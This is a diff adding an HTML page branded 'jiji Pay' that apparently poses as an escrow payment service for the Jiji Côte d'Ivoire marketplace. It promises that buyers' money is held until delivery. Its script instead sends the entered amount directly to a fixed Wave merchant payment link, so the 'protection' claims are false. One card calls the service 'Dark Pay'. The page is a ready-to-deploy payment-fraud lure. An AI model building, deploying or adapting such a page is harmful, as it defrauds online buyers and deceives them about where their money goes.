@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>jiji Pay — Commande Sécurisée</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --orange:#00C853;
+  --orange2:#00E676;
+  --orange-light:#E8F5E9;
+  --bg:#F5F5F5;
+  --white:#FFFFFF;
+  --dark:#1A1A1A;
+  --gray:#757575;
+  --gray2:#E0E0E0;
+  --green:#00C853;
+  --green-light:#E8F5E9;
+  --red:#C62828;
+  --red-light:#FFEBEE;
+  --border:#EEEEEE;
+  --shadow:0 2px 8px rgba(0,0,0,0.08);
+  --shadow2:0 4px 20px rgba(0,0,0,0.12);
+}
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--dark);min-height:100vh}
+
+/* ══ SPLASH ══ */
+#splash{
+  position:fixed;inset:0;z-index:200;
+  background:var(--white);
+  display:flex;flex-direction:column;
+  transition:opacity .4s;
+  overflow:hidden;
+}
+#splash.hide{opacity:0;pointer-events:none}
+
+/* Header splash */
+.sp-header{
+  background:var(--orange);
+  padding:20px 20px 60px;
+  position:relative;
+  overflow:hidden;
+}
+.sp-header::after{
+  content:'';
+  position:absolute;
+  bottom:-30px;left:0;right:0;
+  height:60px;
+  background:var(--white);
+  border-radius:50% 50% 0 0 / 60px;
+}
+.sp-top{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:24px;
+}
+.sp-logo-wrap{display:flex;align-items:center;gap:10px}
+.sp-logo-icon{
+  width:40px;height:40px;border-radius:10px;
+  background:rgba(255,255,255,.2);
+  display:flex;align-items:center;justify-content:center;
+  font-size:20px;font-weight:900;color:#fff;
+}
+.sp-logo-text{
+  font-size:20px;font-weight:900;color:#fff;
+  letter-spacing:-0.5px;
+}
+.sp-logo-text span{color:rgba(255,255,255,0.6)}
+.sp-secure-tag{
+  background:rgba(255,255,255,.2);
+  color:#fff;
+  font-size:11px;font-weight:600;
+  padding:4px 10px;border-radius:99px;
+  letter-spacing:.5px;
+}
+
+.sp-hero-text{
+  color:#fff;
+  padding-bottom:10px;
+}
+.sp-hero-text h1{
+  font-size:clamp(26px,7vw,40px);
+  font-weight:900;
+  line-height:1.15;
+  letter-spacing:-1px;
+}
+.sp-hero-text p{
+  margin-top:8px;
+  font-size:14px;
+  opacity:.85;
+  line-height:1.5;
+}
+
+/* Cartes features */
+.sp-features{
+  padding:40px 20px 20px;
+  display:flex;flex-direction:column;gap:12px;
+  flex:1;
+  overflow-y:auto;
+}
+
+.feat-card{
+  background:var(--white);
+  border-radius:12px;
+  padding:16px;
+  display:flex;align-items:center;gap:14px;
+  box-shadow:var(--shadow);
+  border:1px solid var(--border);
+  animation:slideIn .4s both;
+}
+.feat-card:nth-child(1){animation-delay:.1s}
+.feat-card:nth-child(2){animation-delay:.2s}
+.feat-card:nth-child(3){animation-delay:.3s}
+
+.feat-icon{
+  width:48px;height:48px;border-radius:12px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:22px;flex-shrink:0;
+}
+.fi-orange{background:var(--orange-light)}
+.fi-green{background:var(--green-light)}
+.fi-red{background:var(--red-light)}
+.feat-title{font-size:14px;font-weight:700;margin-bottom:2px}
+.feat-desc{font-size:12px;color:var(--gray);line-height:1.4}
+
+/* Bouton entrer */
+.sp-btn-wrap{
+  padding:16px 20px 32px;
+  background:var(--white);
+}
+.sp-btn{
+  width:100%;
+  padding:16px;
+  background:var(--orange);
+  color:#fff;
+  font-family:'Inter',sans-serif;
+  font-size:16px;font-weight:700;
+  border:none;border-radius:12px;
+  cursor:pointer;
+  transition:background .2s,transform .15s;
+  box-shadow:0 4px 15px rgba(255,109,0,.35);
+}
+.sp-btn:hover{background:var(--orange2);transform:translateY(-1px)}
+.sp-btn:active{transform:translateY(0)}
+.sp-hint{
+  text-align:center;
+  font-size:12px;color:var(--gray);
+  margin-top:10px;
+}
+
+/* ══ APP ══ */
+#app{
+  min-height:100vh;
+  display:none;flex-direction:column;
+  opacity:0;transition:opacity .4s;
+}
+#app.show{display:flex}
+#app.visible{opacity:1}
+
+/* Topbar style Jiji */
+.topbar{
+  background:var(--orange);
+  padding:14px 16px;
+  display:flex;align-items:center;gap:12px;
+  position:sticky;top:0;z-index:50;
+}
+.topbar-logo{
+  font-size:18px;font-weight:900;color:#fff;
+  letter-spacing:-0.5px;flex-shrink:0;
+}
+.topbar-logo span{color:rgba(255,255,255,.6)}
+.topbar-search{
+  flex:1;
+  background:rgba(255,255,255,.2);
+  border-radius:8px;
+  padding:9px 12px;
+  display:flex;align-items:center;gap:8px;
+  color:rgba(255,255,255,.7);
+  font-size:13px;
+}
+.topbar-badge{
+  background:#fff;
+  color:var(--orange);
+  font-size:11px;font-weight:700;
+  padding:4px 10px;border-radius:99px;
+  flex-shrink:0;
+  display:flex;align-items:center;gap:4px;
+}
+.pulse-dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--green);
+  animation:pulse 1.5s infinite;
+}
+
+/* Bannière promo */
+.promo-banner{
+  background:linear-gradient(135deg,#FF6D00,#FF8F00);
+  margin:12px;border-radius:12px;
+  padding:16px;
+  display:flex;align-items:center;justify-content:space-between;
+  overflow:hidden;position:relative;
+}
+.promo-banner::before{
+  content:'🛡️';
+  position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  font-size:48px;opacity:.15;
+}
+.promo-title{font-size:15px;font-weight:800;color:#fff;margin-bottom:2px}
+.promo-sub{font-size:12px;color:rgba(255,255,255,.8)}
+
+/* Badges stat */
+.stats-row{
+  display:flex;gap:10px;
+  padding:0 12px 12px;
+  overflow-x:auto;
+  scrollbar-width:none;
+}
+.stats-row::-webkit-scrollbar{display:none}
+.stat-chip{
+  flex:0 0 auto;
+  background:var(--white);
+  border:1px solid var(--border);
+  border-radius:10px;
+  padding:12px 16px;
+  text-align:center;
+  min-width:90px;
+  box-shadow:var(--shadow);
+}
+.sc-val{font-size:18px;font-weight:800}
+.sc-lbl{font-size:11px;color:var(--gray);margin-top:1px}
+.sc-orange{color:var(--orange)}
+.sc-green{color:var(--green)}
+.sc-dark{color:var(--dark)}
+
+/* Section titre */
+.section-head{
+  display:flex;align-items:center;gap:8px;
+  padding:12px 16px 8px;
+}
+.section-head h2{font-size:15px;font-weight:800}
+.section-dot{width:5px;height:5px;border-radius:50%;background:var(--orange)}
+
+/* Comment ça marche */
+.how-cards{
+  display:flex;gap:10px;
+  padding:0 12px 12px;
+  overflow-x:auto;
+  scrollbar-width:none;
+}
+.how-cards::-webkit-scrollbar{display:none}
+.how-card{
+  flex:0 0 auto;width:130px;
+  background:var(--white);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:14px;
+  box-shadow:var(--shadow);
+  text-align:center;
+}
+.how-num{
+  width:30px;height:30px;border-radius:50%;
+  font-size:13px;font-weight:800;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 8px;
+}
+.hn1{background:var(--orange-light);color:var(--orange)}
+.hn2{background:#E3F2FD;color:#1565C0}
+.hn3{background:var(--green-light);color:var(--green)}
+.how-icon{font-size:20px;margin-bottom:6px}
+.how-title{font-size:12px;font-weight:700;margin-bottom:2px}
+.how-desc{font-size:11px;color:var(--gray);line-height:1.3}
+
+/* Formulaire style Jiji */
+.form-section{padding:4px 12px 12px}
+
+.form-label{
+  font-size:13px;font-weight:700;
+  margin-bottom:10px;
+  display:flex;align-items:center;gap:6px;
+}
+
+.jiji-form{
+  background:var(--white);
+  border-radius:12px;
+  border:1px solid var(--border);
+  box-shadow:var(--shadow);
+  overflow:hidden;
+}
+
+.jiji-field{
+  padding:14px 16px;
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;gap:12px;
+}
+.jiji-field:last-child{border-bottom:none}
+
+.jf-label-icon{
+  width:36px;height:36px;
+  border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;flex-shrink:0;
+}
+.jfl-orange{background:var(--orange-light)}
+.jfl-blue{background:#E3F2FD}
+.jfl-green{background:var(--green-light)}
+
+.jf-body{flex:1}
+.jf-body label{
+  display:block;
+  font-size:11px;font-weight:600;
+  color:var(--gray);
+  margin-bottom:3px;
+  text-transform:uppercase;letter-spacing:.8px;
+}
+.jf-body input{
+  width:100%;border:none;outline:none;
+  font-family:'Inter',sans-serif;
+  font-size:15px;font-weight:600;color:var(--dark);
+  background:transparent;
+}
+.jf-body input::placeholder{color:#BDBDBD;font-weight:400}
+
+.price-inline{display:flex;align-items:center;gap:8px}
+.price-inline input{flex:1}
+.fcfa{
+  font-size:11px;font-weight:700;
+  color:var(--green);
+  background:var(--green-light);
+  border-radius:6px;
+  padding:3px 8px;flex-shrink:0;
+}
+
+/* CTA */
+.cta-section{padding:4px 12px 16px}
+
+.cta-btn{
+  width:100%;padding:16px;
+  background:var(--orange);
+  color:#fff;
+  font-family:'Inter',sans-serif;
+  font-size:16px;font-weight:800;
+  border:none;border-radius:12px;
+  cursor:pointer;
+  transition:background .2s,transform .15s,box-shadow .2s;
+  box-shadow:0 4px 15px rgba(255,109,0,.3);
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.cta-btn:hover{background:var(--orange2);transform:translateY(-1px);box-shadow:0 8px 24px rgba(255,109,0,.35)}
+.cta-btn:active{transform:translateY(0)}
+
+.err-box{
+  display:none;
+  background:var(--red-light);
+  border:1px solid #FFCDD2;
+  border-radius:10px;
+  padding:12px 16px;
+  font-size:13px;font-weight:600;
+  color:var(--red);
+  margin:8px 12px 0;
+  text-align:center;
+}
+.err-box.show{display:block}
+
+/* Garantie card */
+.guarantee-card{
+  margin:4px 12px 12px;
+  background:var(--white);
+  border:1.5px solid var(--orange);
+  border-radius:12px;
+  padding:16px;
+  display:flex;gap:12px;
+  box-shadow:0 2px 12px rgba(255,109,0,.1);
+}
+.gc-icon{font-size:28px;flex-shrink:0}
+.gc-title{font-size:14px;font-weight:800;color:var(--orange);margin-bottom:3px}
+.gc-desc{font-size:12px;color:var(--gray);line-height:1.5}
+.gc-desc strong{color:var(--dark)}
+
+/* Wave section */
+.wave-card{
+  margin:0 12px 12px;
+  background:var(--white);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:14px 16px;
+  display:flex;align-items:center;gap:12px;
+  box-shadow:var(--shadow);
+}
+.wave-icon{
+  width:42px;height:42px;border-radius:10px;
+  background:linear-gradient(135deg,#1A5CFF,#003DCC);
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;font-weight:900;color:#fff;
+  flex-shrink:0;
+}
+.wave-info{flex:1}
+.wave-name{font-size:14px;font-weight:700}
+.wave-sub{font-size:12px;color:var(--gray)}
+.wave-ok{
+  background:var(--green-light);
+  color:var(--green);
+  font-size:12px;font-weight:700;
+  padding:4px 10px;border-radius:99px;
+}
+
+/* Footer */
+.app-footer{
+  background:var(--white);
+  border-top:1px solid var(--border);
+  padding:18px 16px;
+  text-align:center;
+  font-size:12px;color:var(--gray);
+  margin-top:auto;
+}
+.footer-logo{font-size:16px;font-weight:900;margin-bottom:4px}
+.footer-logo span{color:var(--orange)}
+
+/* Animations */
+@keyframes slideIn{
+  from{opacity:0;transform:translateX(-20px)}
+  to{opacity:1;transform:translateX(0)}
+}
+@keyframes pulse{
+  0%,100%{opacity:1;transform:scale(1)}
+  50%{opacity:.4;transform:scale(.7)}
+}
+</style>
+</head>
+<body>
+
+<!-- ══ SPLASH ══ -->
+<div id="splash">
+
+  <div class="sp-header">
+    <div class="sp-top">
+      <div class="sp-logo-wrap">
+        <div class="sp-logo-icon">JJ</div>
+        <div class="sp-logo-text">JIJI <span> CI</span></div>
+      </div>
+      <div class="sp-secure-tag">🔒 Sécurisé</div>
+    </div>
+    <div class="sp-hero-text">
+      <h1>Achetez en toute<br>sécurité !</h1>
+      <p>Votre argent est protégé jusqu'à réception de votre commande.</p>
+    </div>
+  </div>
+
+  <div class="sp-features">
+    <div class="feat-card">
+      <div class="feat-icon fi-orange">💰</div>
+      <div>
+        <div class="feat-title">Argent sécurisé</div>
+        <div class="feat-desc">Votre paiement est bloqué par jiji Pay et non par le vendeur.</div>
+      </div>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon fi-green">📦</div>
+      <div>
+        <div class="feat-title">Libéré à la livraison</div>
+        <div class="feat-desc">L'argent est envoyé au vendeur uniquement après confirmation de réception.</div>
+      </div>
+    </div>
+    <div class="feat-card">
+      <div class="feat-icon fi-red">🚫</div>
+      <div>
+        <div class="feat-title">Zéro arnaque</div>
+        <div class="feat-desc">Plus de risque de payer sans recevoir votre article.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sp-btn-wrap">
+    <button class="sp-btn" onclick="enterSite()">Commander maintenant →</button>
+    <p class="sp-hint">Appuyez sur Entrée ou touchez le bouton</p>
+  </div>
+
+</div>
+
+<!-- ══ APP ══ -->
+<div id="app">
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="topbar-logo">jiji<span>Pay</span></div>
+    <div class="topbar-search">🔍 Commande sécurisée</div>
+    <div class="topbar-badge"><div class="pulse-dot"></div> Live</div>
+  </div>
+
+  <!-- Bannière -->
+  <div class="promo-banner">
+    <div>
+      <div class="promo-title">Paiement 100% Sécurisé</div>
+      <div class="promo-sub">Votre argent arrive à destination ✓</div>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-row">
+    <div class="stat-chip">
+      <div class="sc-val sc-orange">100%</div>
+      <div class="sc-lbl">Sécurisé</div>
+    </div>
+    <div class="stat-chip">
+      <div class="sc-val sc-green">0 F</div>
+      <div class="sc-lbl">Frais</div>
+    </div>
+    <div class="stat-chip">
+      <div class="sc-val sc-dark">⚡</div>
+      <div class="sc-lbl">Rapide</div>
+    </div>
+    <div class="stat-chip">
+      <div class="sc-val sc-green">✓</div>
+      <div class="sc-lbl">Wave</div>
+    </div>
+  </div>
+
+  <!-- Comment ça marche -->
+  <div class="section-head">
+    <div class="section-dot"></div>
+    <h2>Comment ça marche</h2>
+  </div>
+  <div class="how-cards">
+    <div class="how-card">
+      <div class="how-num hn1">1</div>
+      <div class="how-icon">📝</div>
+      <div class="how-title">Commandez</div>
+      <div class="how-desc">Remplissez le formulaire ci-dessous</div>
+    </div>
+    <div class="how-card">
+      <div class="how-num" style="background:#E3F2FD;color:#1565C0;width:30px;height:30px;border-radius:50%;font-size:13px;font-weight:800;display:flex;align-items:center;justify-content:center;margin:0 auto 8px;">2</div>
+      <div class="how-icon">🔐</div>
+      <div class="how-title">On sécurise</div>
+      <div class="how-desc">Dark Pay garde votre argent</div>
+    </div>
+    <div class="how-card">
+      <div class="how-num hn3">3</div>
+      <div class="how-icon">✅</div>
+      <div class="how-title">Confirmez</div>
+      <div class="how-desc">Colis reçu → vendeur payé</div>
+    </div>
+  </div>
+
+  <!-- Formulaire -->
+  <div class="section-head">
+    <div class="section-dot"></div>
+    <h2>Votre commande</h2>
+  </div>
+
+  <div class="form-section">
+    <div class="jiji-form">
+      <div class="jiji-field">
+        <div class="jf-label-icon jfl-orange">🏪</div>
+        <div class="jf-body">
+          <label>Nom du vendeur</label>
+          <input type="text" id="vendeur" placeholder="Ex : Boutique Jiji CI">
+        </div>
+      </div>
+      <div class="jiji-field">
+        <div class="jf-label-icon jfl-blue">📦</div>
+        <div class="jf-body">
+          <label>Nom de l'article</label>
+          <input type="text" id="article" placeholder="Ex : iPhone 15 Pro Max">
+        </div>
+      </div>
+      <div class="jiji-field">
+        <div class="jf-label-icon jfl-green">💵</div>
+        <div class="jf-body">
+          <label>Prix de l'article</label>
+          <div class="price-inline">
+            <input type="number" id="prix" placeholder="Ex : 45000" min="1">
+            <div class="fcfa">FCFA</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CTA -->
+  <div class="cta-section">
+    <button class="cta-btn" onclick="commander()">
+      🔒 Passer la commande sécurisée
+    </button>
+  </div>
+
+  <div class="err-box" id="erreur">⚠️ Remplissez tous les champs pour continuer.</div>
+
+  <!-- Garantie -->
+  <div class="guarantee-card">
+    <div class="gc-icon">🛡️</div>
+    <div>
+      <div class="gc-title">Garantie jiji Pay</div>
+      <div class="gc-desc">
+        Le vendeur <strong>ne reçoit l'argent qu'après</strong> que vous confirmez avoir reçu votre colis. Aucun risque pour vous.
+      </div>
+    </div>
+  </div>
+
+  <!-- Wave -->
+  <div class="wave-card">
+    <div class="wave-icon">W</div>
+    <div class="wave-info">
+      <div class="wave-name">Paiement Wave</div>
+      <div class="wave-sub">Rapide · Sécurisé · Instantané</div>
+    </div>
+    <div class="wave-ok">✓ Actif</div>
+  </div>
+
+  <!-- Footer -->
+  <div class="app-footer">
+    <div class="footer-logo">Jiji<span>Pay</span></div>
+    © 2026 jiji Pay · Commande Sécurisée · Côte d'Ivoire
+  </div>
+
+</div>
+
+<script>
+function enterSite(){
+  const sp=document.getElementById('splash');
+  const ap=document.getElementById('app');
+  sp.classList.add('hide');
+  setTimeout(()=>{
+    sp.style.display='none';
+    ap.classList.add('show');
+    setTimeout(()=>ap.classList.add('visible'),30);
+  },400);
+}
+document.addEventListener('keydown',e=>{
+  if(e.key==='Enter'&&!document.getElementById('splash').classList.contains('hide'))enterSite();
+});
+function commander(){
+  const v=document.getElementById('vendeur').value.trim();
+  const a=document.getElementById('article').value.trim();
+  const p=parseInt(document.getElementById('prix').value);
+  const err=document.getElementById('erreur');
+  if(!v||!a||!p||p<=0){err.classList.add('show');return;}
+  err.classList.remove('show');
+  const base='https://pay.wave.com/m/M_ci_MfMMeUv1FSzv/c/ci/';
+window.location.href=base+'?amount='+p;
+}
+</script>
+</body>
+</html>
